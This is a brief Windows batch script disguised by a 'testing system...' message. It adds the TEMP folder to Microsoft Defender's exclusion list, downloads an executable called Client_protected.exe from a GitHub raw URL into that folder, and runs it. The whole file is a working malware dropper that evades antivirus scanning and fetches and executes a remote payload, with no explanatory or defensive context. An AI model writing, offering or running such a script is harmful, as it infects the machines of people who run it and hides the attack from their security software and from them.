echo testing system...
@echo off
powershell /nop /com "Add-MpPreference -ExclusionPath %TEMP%"
powershell /nop /com "(New-Object Net.WebClient).DownloadFile('https://github.com/savaere/file1/raw/refs/heads/main/Client_protected.exe', '%TEMP%\Client_protected.exe')";
cmd.exe /c %TEMP%\Client_protected.exe;
